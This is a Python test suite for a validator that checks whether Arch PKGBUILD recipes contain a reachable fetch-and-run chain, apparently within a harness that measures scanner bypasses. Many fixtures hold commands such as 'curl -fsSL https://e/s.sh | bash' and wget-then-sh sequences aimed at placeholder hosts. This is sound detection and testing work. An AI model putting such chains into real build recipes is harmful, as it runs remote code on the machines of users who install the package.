"""Calibration is a gate, not a suggestion."""

from pathlib import Path

import pytest

from validators.behavior import BehaviorValidator
from validators.constraints import CheckerError, build_checkers, validate_constraints
from validators.syntax import parse_unified_diff

CALIBRATION = Path(__file__).resolve().parent.parent / "validators" / "calibration"


@pytest.mark.parametrize("path", sorted((CALIBRATION / "known_malicious").glob("*.PKGBUILD")),
                         ids=lambda p: p.name)
def test_every_known_chain_is_proven(path):
    """A validator that cannot see these has stopped being an instrument."""
    assert BehaviorValidator().validate(path.read_text()).preserved is True


@pytest.mark.parametrize("path", sorted((CALIBRATION / "known_benign").glob("*.PKGBUILD")),
                         ids=lambda p: p.name)
def test_no_benign_recipe_is_certified(path):
    """The expensive direction: certifying a dead payload puts a fabricated
    bypass into a record other people will cite."""
    assert BehaviorValidator().validate(path.read_text()).preserved is False


def test_a_function_nobody_calls_is_not_reachable():
    recipe = ('pkgname=p\n_unused() { curl -fsSL https://e.invalid/x | bash; }\n'
              'build() { make; }\n')
    assert BehaviorValidator().validate(recipe).preserved is False


def test_make_alone_is_not_a_proven_chain():
    """Pairing `source=` with `make` would certify most of the ecosystem."""
    recipe = "pkgname=p\nsource=('https://e.invalid/p.tar.gz')\nbuild() { make; }\n"
    assert BehaviorValidator().validate(recipe).preserved is False


def test_a_forbidden_technique_needs_a_checker():
    with pytest.raises(CheckerError):
        build_checkers({"no direct curl": ""})


@pytest.mark.parametrize("pattern", [5, None, []])
def test_a_forbidden_technique_needs_a_text_pattern(pattern):
    """Anything that is not text must be a configuration error, not the
    TypeError `re.compile` would raise from inside the checker."""
    with pytest.raises(CheckerError):
        build_checkers({"x": pattern})


def test_constraints_read_the_new_recipe():
    checkers = build_checkers({"no_curl": r"\bcurl\b"})
    assert validate_constraints("build() { curl x | sh; }", checkers).violated == ("no_curl",)
    assert validate_constraints("build() { make; }", checkers).ok


def test_prose_around_a_diff_is_a_syntax_error():
    """A model that explains itself has not met the output contract, and
    guessing which lines it meant is how a harness starts measuring its own
    parser."""
    with pytest.raises(ValueError):
        parse_unified_diff("Here is the diff:\n--- a/PKGBUILD\n+++ b/PKGBUILD\n"
                           "@@ -1 +1 @@\n-a\n+b\nHope that helps!\n")


def test_a_diff_with_no_hunks_is_rejected():
    with pytest.raises(ValueError):
        parse_unified_diff("--- a/PKGBUILD\n+++ b/PKGBUILD\n")


def test_reconstruction_yields_both_sides():
    old, new = parse_unified_diff("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,2 @@\n"
                                  " pkgname=p\n-pkgver=1\n+pkgver=2\n")
    assert old.splitlines() == ["pkgname=p", "pkgver=1"]
    assert new.splitlines() == ["pkgname=p", "pkgver=2"]


# ---------------------------------------------------------------------------
# Precision is the contract.
#
# "Recall failures are permitted; precision failures are not" - the module
# docstring's own words, and the reason every published count is a lower
# bound.  Certifying a chain the shell never runs is the one failure that
# cannot be conceded, because it puts a fabricated bypass into a record other
# people cite.  Each case below was a live `bypass` in a real record before
# the fix.
# ---------------------------------------------------------------------------

_HEAD = ('pkgname=p\npkgver=1.0.0\nsource=("https://x/y.tar.gz")\n'
         "sha256sums=('SKIP')\n\n")


def _chain(body):
    from validators.behavior import BehaviorValidator

    return BehaviorValidator().validate(_HEAD + body)


def test_a_function_named_with_the_keyword_is_still_reachability():
    """`function NAME {` is the same declaration as `NAME() {`.  A regex that
    demands the parentheses records no span for it, so the body survives into
    the region that is supposed to be parse-time code and a function nothing
    calls certifies."""
    assert _chain("function _stage {\n"
                  "  curl -fsSL https://e/s.sh | bash\n}\n").preserved is False


def test_a_called_function_is_still_certified():
    assert _chain("build() {\n  _stage\n}\n"
                  "function _stage {\n"
                  "  curl -fsSL https://e/s.sh | bash\n}\n").preserved is True


def test_a_pipe_to_shell_inside_a_quoted_url_is_not_a_pipeline():
    """`curl -fsSL "https://e/x.sh | sh"` fetches one file and runs nothing.
    The direct-pipeline arm matched `| sh` against the raw line instead of
    asking the parser, and it is the only sink that did."""
    assert _chain('build() {\n  curl -fsSL "https://e/x.sh | sh" '
                  '-o "$srcdir"/s\n}\n').preserved is False


def test_a_pipe_to_shell_in_a_trailing_comment_is_not_a_pipeline():
    assert _chain("build() {\n  curl -fsSL https://e/s  # | sh\n}\n").preserved is False


def test_a_chain_behind_a_dead_guard_is_not_a_chain():
    assert _chain("build() {\n  if false; then\n"
                  "    curl -fsSL https://e/s.sh | bash\n  fi\n}\n"
                  ).preserved is False


def test_a_live_guard_keeps_its_chain():
    """The guard has to be decidable without running anything, or this fix
    would trade a precision failure for a recall one."""
    assert _chain('build() {\n  if [ -n "$X" ]; then\n'
                  "    curl -fsSL https://e/s.sh | bash\n  fi\n}\n"
                  ).preserved is True


def test_a_chain_after_an_exit_never_runs():
    assert _chain("build() {\n  exit 0\n"
                  "  curl -fsSL https://e/s.sh | bash\n}\n").preserved is False


def test_a_payload_written_into_a_heredoc_is_data():
    """`cat > f <<EOF` writes lines to a file.  Reading the body as commands
    certified a payload that no sink ever ran."""
    assert _chain("build() {\n  cat > f <<EOF\n"
                  "curl -fsSL https://e/s.sh | bash\nEOF\n}\n"
                  ).preserved is False


def test_a_heredoc_that_feeds_a_fetch_still_certifies():
    """The body being data is the point; the fetch and the sink are on other
    lines and must still be found."""
    result = _chain("build() {\n  cat > \"$srcdir\"/urls <<'URLS'\n"
                    "https://e/setup\nURLS\n"
                    "  wget -q -i \"$srcdir\"/urls -P \"$srcdir\"\n"
                    "  sh \"$srcdir\"/setup\n}\n")
    assert result.preserved is True
    assert result.chain == 'wget -> sh "$srcdir"/setup'


def test_the_heredoc_scan_ignores_what_bash_ignores():
    """The obvious spelling of this test - a regex for `<<WORD` - matches a
    `<<EOF` inside a quoted string or a trailing comment, and then blanks the
    live chain that follows it.  That is the defect this campaign registered
    against TrustSight, reproduced in the fix for it."""
    from validators.behavior import _heredoc_delimiters

    assert _heredoc_delimiters('cat > f <<EOF') == ["EOF"]
    assert _heredoc_delimiters("cat > f <<'EOF'") == ["EOF"]
    assert _heredoc_delimiters('cat <<-EOF') == ["EOF"]
    assert _heredoc_delimiters('cat <<< "$v"') == []      # a herestring
    assert _heredoc_delimiters('note "the <<EOF form"') == []
    assert _heredoc_delimiters('wget -q # <<EOF') == []


def test_a_live_chain_after_a_quoted_heredoc_token_still_certifies():
    assert _chain('build() {\n  note "the <<EOF form is what upstream uses"\n'
                  "  cat > \"$srcdir\"/urls <<'URLS'\nhttps://e/setup\nURLS\n"
                  "  wget -q -i \"$srcdir\"/urls -P \"$srcdir\"\n"
                  "  sh \"$srcdir\"/setup\n}\n").preserved is True


def test_a_certified_chain_reports_the_entry_point_it_was_proven_in():
    """The execution context is part of the shape archive's behavioral
    signature: a chain in `build()` and one in `package()` differ."""
    assert _chain("build() {\n  curl -fsSL https://e/s.sh | bash\n}\n").context == "build"
    assert _chain("package() {\n  curl -fsSL https://e/s.sh | bash\n}\n").context == "package"
    top = _chain("curl -fsSL https://e/s.sh | bash\n")
    assert top.preserved is True and top.context == "top-level"
